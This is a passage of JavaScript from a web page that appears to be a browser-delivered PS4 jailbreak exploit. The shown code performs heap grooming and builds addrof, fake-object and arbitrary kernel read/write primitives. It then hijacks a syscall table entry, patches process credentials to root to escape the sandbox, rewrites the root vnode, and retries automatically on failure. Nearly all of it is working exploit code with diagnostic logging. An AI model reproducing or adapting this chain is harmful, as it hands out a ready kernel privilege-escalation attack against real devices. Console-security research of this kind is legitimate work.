    }

    if (compositionState === 0) {
        mark("NO-RESULT", "critical-load-did-not-finish");
        scheduleRetry("no-result");
        return;
    }

    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
    mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector) + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)) + "-length=0x100-mode=0x" + targetHeader[0x28].toString(16));
    mark("RW-HEADER-HEX", dumpHex(rwHeader));
    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));

    var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
    var writePass = writeObserved && restoreObserved;
    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
    if (readPass) mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
    else mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK + "-target-header=" + targetHeaderOK + "-observed=" + readObserved + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));

    if (writePass) mark("ARBITRARY-WRITE-PASS", "as-to-as-to-as-restored=true");
    else mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved + "-restore=" + restoreObserved);

    if (readPass && writePass) {
        attemptSucceeded = true;
        mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
        if (!testRun) {
            testRun = true;
            setTimeout(runJailbreak, 500);
        }
    }

    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
    setTimeout(function() { mark("SURVIVED-T100"); }, 100);
    setTimeout(function() { mark("SURVIVED-T1000"); }, 1000);
    setTimeout(function() { mark("SURVIVED-T3000"); }, 3000);
    if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        var slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        var separator = buffer(SEPARATOR_SIZE);
        var earlyHole = buffer(EARLY_HOLE_SIZE);
        var guard = buffer(GUARD_SIZE);
        var predecessor = buffer(PREDECESSOR_SIZE);
        var finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) {
        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
        scheduleRetry("addrof-no-result");
        return;
    }
    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
        scheduleRetry("addrof-threw");
        return;
    }

    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0) + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));

    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
        scheduleRetry("addrof-fail");
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
        scheduleRetry("target-addr-fail");
        return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
        scheduleRetry("fake-addr-fail");
        return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
    runGroomAndLoad();
}

// ========== R/W PRIMITIVES ==========
function read64(addr) {
    if (!globalFakeArray) return 0n;
    var oldVec = [];
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];

    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;

    var val = 0n;
    for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);

    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
    return val;
}

function write64(addr, value) {
    if (!globalFakeArray) return;
    var oldVec = [];
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];

    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;

    var v = BigInt(value);
    for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);

    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
}

// ========== PS4 JAILBREAK ==========
function runJailbreak() {
    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);

    try {
        var evf = fwOffsets.evf;
        var prison0 = fwOffsets.prison0;
        var rootvnode = fwOffsets.rootvnode;
        var sysent = fwOffsets.sysent;
        var jmp = fwOffsets.jmp;

        var kbase = 0xffffffff80000000n;
        mark("KERNEL-BASE", hex(kbase));

        var sysent_661 = kbase + BigInt(sysent);
        var jmp_rsi = kbase + BigInt(jmp);
        mark("SYSENT-661", hex(sysent_661));
        mark("JMP-RSI", hex(jmp_rsi));

        var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
        var sy_call = read64(sysent_661 + 8n);
        var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);

        write64(sysent_661, 2n);
        write64(sysent_661 + 8n, jmp_rsi);
        write64(sysent_661 + 0x2Cn, 1n);
        mark("SYSENT-HIJACKED", "success");

        var proc = kbase + BigInt(evf);
        var sandboxEscaped = false;
        var verifyUid = -1n;
        var verifyGid = -1n;
        var verifyPrison = -1n;
        var dbgMode = Q.get("dbg") === "1";

        function patchAndVerifyUcred(ucred, prisonVal) {
            write64(ucred + 0x04n, 0n);
            write64(ucred + 0x08n, 0n);
            write64(ucred + 0x0Cn, 0n);
            write64(ucred + 0x10n, 1n);
            write64(ucred + 0x30n, prisonVal);
            verifyUid = read64(ucred + 0x04n);
            verifyGid = read64(ucred + 0x08n);
            verifyPrison = read64(ucred + 0x30n);
            return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonVal;
        }

        var prisonVal = read64(kbase + BigInt(prison0));
        var hits = 0;
        for (var i = 0; i < 0x4000; i += 8) {
            try {
                var candidate = read64(proc + BigInt(i));
                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
                    hits++;
                    var ucred = read64(proc + BigInt(i - 0x40));
                    if (ucred > 0n && ucred < 0xffffffffffffn) {
                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + i.toString(16) + "-ucred=" + hex(ucred));
                        if (patchAndVerifyUcred(ucred, prisonVal)) {
                            sandboxEscaped = true;
                            mark("SANDBOX-ESCAPE", "success");
                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                        }
                        break;
                    }
                }
            } catch(e) {}
        }
        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");

        if (!sandboxEscaped) {
            var sigStart = proc - 0x4000n;
            var sigEnd = proc + 0x4000n;
            var sigFound = 0n;
            for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
                try {
                    var ref = Number(read64(s) & 0xFFFFFFFFn);
                    if (ref < 1 || ref > 0x200) continue;
                    var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
                    if (ngroups < 1 || ngroups > 0x80) continue;
                    var pr = read64(s + 0x30n);
                    if (pr !== prisonVal) continue;
                    if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
                    if (patchAndVerifyUcred(s, prisonVal)) {
                        sandboxEscaped = true;
                        sigFound = s;
                        mark("UCRED-SIG-FOUND", hex(s));
                        mark("SANDBOX-ESCAPE", "success");
                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                    }
                } catch(e) {}
            }
            if (!sandboxEscaped) {
                mark("SANDBOX-ESCAPE", "FAILED-not-found");
                if (dbgMode) {
                    var dump = "";
                    for (var d = 0; d < 0x100; d += 16) {
                        var ln = hex(proc + BigInt(d)) + ": ";
                        for (var c = 0; c < 16; c++) {
                            var b = Number(read64(proc + BigInt(d + c)) & 0xFFn);
                            ln += (b < 16 ? "0" : "") + b.toString(16);
                        }
                        dump += ln + "\n";
                    }
                    mark("PROC-DUMP", dump.trim());
                }
            }
        }

        var root = read64(kbase + BigInt(rootvnode));
        var rootVerified = false;
        if (root > 0n && root < 0xffffffffffffn) {
            var fd = read64(proc + BigInt(0x48));
            write64(fd + 0x10n, root);
            write64(fd + 0x18n, root);
            var fdCheck = read64(fd + 0x10n);
            rootVerified = fdCheck === root;
            mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
            mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
        } else {
            mark("ROOT-VNODE-SET", "FAILED-invalid-root");
        }

        write64(sysent_661, BigInt(sy_narg));
        write64(sysent_661 + 8n, sy_call);
        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
        mark("SYSENT-RESTORED", "success");

        mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);

    } catch (error) {
        mark("JAILBREAK-ERROR", error.message);
    }
}

// ========== AUTO-RETRY ENGINE ==========
var attemptSucceeded = false;

function cleanupForRetry() {
    try { history.replaceState(undefined, ""); } catch (_) {}
    try { sessionStorage.removeItem(REVISION + ":blocked"); } catch (_) {}
    try { sessionStorage.removeItem(REVISION + ":passed"); } catch (_) {}
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    fillerGraph = null;
    outerGraph = null;
    rwBuffer = null; rwView = null; rwMirror = null;
    targetBuffer = null; targetView = null;
    globalFakeArray = null;
    referenceTarget = null;
    lengthWord = null;
    predecessorWords = null;
    leakedScope = null;
    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
    keepIndex = 0;
    captureState = 0;
    hostAddress = NaN; fakeAddress = NaN; targetAddress = NaN;
    rwHeaderOK = false; targetHeaderOK = false;
    readObserved = false; writeObserved = false; restoreObserved = false;
    compositionState = 0;
    retrySafe = false;
}

function scheduleRetry(reason) {
    attemptSucceeded = false;
    if (attemptNumber >= MAX_ATTEMPTS) {
        mark("GIVE-UP", "all-" + MAX_ATTEMPTS + "-attempts-failed last=" + reason);
        mark("ADVICE", "power-cycle-the-ps4-fresh-boot-then-one-clean-load");
        return;
    }
    mark("RETRY", "reason=" + reason + "-next=" + (attemptNumber + 1) + "-of-" + MAX_ATTEMPTS);
    setTimeout(runAttempt, 1500);
}

function runAttempt() {
    attemptNumber++;
    if (attemptNumber > 1) cleanupForRetry();
    mark("ATTEMPT", attemptNumber + "-of-" + MAX_ATTEMPTS + "-n=" + DRAIN_COUNT);
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
        scheduleRetry("setup");
    }
}

// ========== INIT ==========
mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-attempts=" + MAX_ATTEMPTS);
runAttempt();
</script>
